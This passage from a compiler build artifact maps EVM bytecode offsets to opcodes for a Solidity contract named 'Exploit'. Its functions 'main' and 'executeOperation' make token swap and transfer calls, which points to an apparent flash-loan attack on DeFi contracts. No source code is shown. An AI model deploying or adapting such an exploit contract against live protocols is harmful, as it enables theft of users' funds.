    "2359": {
      "fn": "Exploit.main",
      "offset": [
        2479,
        2490
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "2362": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2479,
        2490
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2363": {
      "fn": "Exploit.main",
      "offset": [
        2479,
        2490
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2364": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2366": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2367": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2368": {
      "fn": "Exploit.main",
      "offset": [
        2518,
        2519
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2370": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2372": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2373": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "ADD",
      "path": "0"
    },
    "2374": {
      "op": "MSTORE"
    },
    "2375": {
      "fn": "Exploit.main",
      "offset": [
        2521,
        2522
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "2377": {
      "op": "SWAP2"
    },
    "2378": {
      "op": "DUP2"
    },
    "2379": {
      "op": "ADD"
    },
    "2380": {
      "op": "SWAP2"
    },
    "2381": {
      "op": "SWAP1"
    },
    "2382": {
      "op": "SWAP2"
    },
    "2383": {
      "op": "MSTORE"
    },
    "2384": {
      "fn": "Exploit.main",
      "offset": [
        2500,
        2504
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "2385": {
      "fn": "Exploit.main",
      "offset": [
        2500,
        2504
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2386": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "2388": {
      "op": "ADD"
    },
    "2389": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2390": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2392": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2393": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2395": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2396": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2397": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "SUB",
      "path": "0"
    },
    "2398": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "SUB",
      "path": "0"
    },
    "2399": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2400": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2401": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2402": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2404": {
      "fn": "Exploit.main",
      "offset": [
        2507,
        2523
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2405": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2407": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2408": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP6",
      "path": "0"
    },
    "2409": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "2414": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "AND",
      "path": "0"
    },
    "2415": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "2417": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SHL",
      "path": "0"
    },
    "2418": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2419": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2420": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2422": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "ADD",
      "path": "0"
    },
    "2423": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x983"
    },
    "2426": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "2427": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2428": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2429": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2430": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2431": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x144E"
    },
    "2434": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2435": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2436": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2438": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2440": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2441": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2442": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2443": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "SUB",
      "path": "0"
    },
    "2444": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2445": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2447": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP8",
      "path": "0"
    },
    "2448": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2449": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "2450": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2451": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2452": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2453": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x99D"
    },
    "2456": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2457": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2459": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2460": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2461": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2462": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "POP",
      "path": "0"
    },
    "2463": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "GAS",
      "path": "0"
    },
    "2464": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "CALL",
      "path": "0"
    },
    "2465": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2466": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2467": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2468": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9B1"
    },
    "2471": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2472": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2473": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2475": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2476": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2477": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2478": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2480": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2481": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2482": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "POP",
      "path": "0"
    },
    "2483": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "POP",
      "path": "0"
    },
    "2484": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "POP",
      "path": "0"
    },
    "2485": {
      "fn": "Exploit.main",
      "offset": [
        2439,
        2524
      ],
      "op": "POP",
      "path": "0"
    },
    "2486": {
      "fn": "Exploit.main",
      "offset": [
        2264,
        2805
      ],
      "op": "POP",
      "path": "0"
    },
    "2487": {
      "fn": "Exploit.main",
      "offset": [
        2264,
        2805
      ],
      "op": "POP",
      "path": "0"
    },
    "2488": {
      "fn": "Exploit.main",
      "jump": "o",
      "offset": [
        2239,
        2805
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2489": {
      "fn": "Exploit.main",
      "offset": [
        2362,
        2651
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2490": {
      "fn": "Exploit.main",
      "offset": [
        2568,
        2582
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 11,
      "value": "0x8"
    },
    "2492": {
      "fn": "Exploit.main",
      "offset": [
        2568,
        2585
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2493": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2495": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2497": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2499": {
      "op": "SHL"
    },
    "2500": {
      "op": "SUB"
    },
    "2501": {
      "fn": "Exploit.main",
      "offset": [
        2568,
        2585
      ],
      "op": "AND",
      "path": "0"
    },
    "2502": {
      "fn": "Exploit.main",
      "offset": [
        2555,
        2591
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "2507": {
      "fn": "Exploit.main",
      "offset": [
        2592,
        2603
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9D5"
    },
    "2510": {
      "fn": "Exploit.main",
      "offset": [
        2568,
        2585
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "2512": {
      "fn": "Exploit.main",
      "offset": [
        2592,
        2599
      ],
      "op": "DUP6",
      "path": "0"
    },
    "2513": {
      "fn": "Exploit.main",
      "offset": [
        2592,
        2603
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "2516": {
      "fn": "Exploit.main",
      "jump": "i",
      "offset": [
        2592,
        2603
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2517": {
      "fn": "Exploit.main",
      "offset": [
        2592,
        2603
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2518": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2520": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2521": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2522": {
      "fn": "Exploit.main",
      "offset": [
        2605,
        2606
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2524": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2526": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2527": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "ADD",
      "path": "0"
    },
    "2528": {
      "op": "DUP2"
    },
    "2529": {
      "op": "SWAP1"
    },
    "2530": {
      "op": "MSTORE"
    },
    "2531": {
      "op": "SWAP2"
    },
    "2532": {
      "op": "DUP2"
    },
    "2533": {
      "op": "ADD"
    },
    "2534": {
      "op": "DUP3"
    },
    "2535": {
      "op": "SWAP1"
    },
    "2536": {
      "op": "MSTORE"
    },
    "2537": {
      "fn": "Exploit.main",
      "offset": [
        2616,
        2620
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "2538": {
      "fn": "Exploit.main",
      "offset": [
        2616,
        2620
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2539": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "2541": {
      "op": "ADD"
    },
    "2542": {
      "fn": "Exploit.main",
      "offset": [
        2623,
        2639
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x955"
    },
    "2545": {
      "op": "JUMP"
    },
    "2546": {
      "fn": "Exploit.executeOperation",
      "offset": [
        3965,
        4195
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2547": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4075,
        4083
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 12,
      "value": "0x9FA"
    },
    "2550": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4075,
        4081
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xAEF"
    },
    "2553": {
      "fn": "Exploit.executeOperation",
      "jump": "i",
      "offset": [
        4075,
        4083
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2554": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4075,
        4083
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2555": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 13,
      "value": "0x3"
    },
    "2557": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2558": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4122
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xF"
    },
    "2560": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4122
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2561": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2563": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2564": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2565": {
      "op": "PUSH4",
      "value": "0xF77C4791"
    },
    "2570": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2572": {
      "op": "SHL"
    },
    "2573": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2574": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2575": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2576": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2577": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2579": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2581": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2583": {
      "op": "SHL"
    },
    "2584": {
      "op": "SUB"
    },
    "2585": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2586": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "DUP5",
      "path": "0"
    },
    "2587": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "AND",
      "path": "0"
    },
    "2588": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2589": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4110
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "2594": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4110
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2595": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4122
      ],
      "op": "AND",
      "path": "0"
    },
    "2596": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4122
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2597": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4133
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xF77C4791"
    },
    "2602": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4133
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2603": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2605": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2606": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2607": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ADD",
      "path": "0"
    },
    "2608": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2609": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2611": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2612": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2613": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2614": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2615": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2616": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SUB",
      "path": "0"
    },
    "2617": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ADD",
      "path": "0"
    },
    "2618": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2619": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4101
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2621": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4122
      ],
      "op": "DUP8",
      "path": "0"
    },
    "2622": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "GAS",
      "path": "0"
    },
    "2623": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "CALL",
      "path": "0"
    },
    "2624": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2625": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2626": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2627": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA50"
    },
    "2630": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2631": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2632": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2634": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2635": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2636": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2637": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2639": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2640": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2641": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "POP",
      "path": "0"
    },
    "2642": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "POP",
      "path": "0"
    },
    "2643": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "POP",
      "path": "0"
    },
    "2644": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "POP",
      "path": "0"
    },
    "2645": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2647": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2648": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2649": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2651": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "NOT",
      "path": "0"
    },
    "2652": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2654": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2655": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ADD",
      "path": "0"
    },
    "2656": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "AND",
      "path": "0"
    },
    "2657": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2658": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ADD",
      "path": "0"
    },
    "2659": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2660": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2662": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2663": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "POP",
      "path": "0"
    },
    "2664": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2665": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "ADD",
      "path": "0"
    },
    "2666": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2667": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA74"
    },
    "2670": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2671": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2672": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13C6"
    },
    "2675": {
      "fn": "Exploit.executeOperation",
      "jump": "i",
      "offset": [
        4111,
        4135
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2676": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4111,
        4135
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2677": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2679": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2680": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2682": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2684": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2686": {
      "op": "SHL"
    },
    "2687": {
      "op": "SUB"
    },
    "2688": {
      "op": "NOT"
    },
    "2689": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "2691": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP5",
      "path": "0"
    },
    "2692": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2693": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SHL",
      "path": "0"
    },
    "2694": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "AND",
      "path": "0"
    },
    "2695": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2696": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
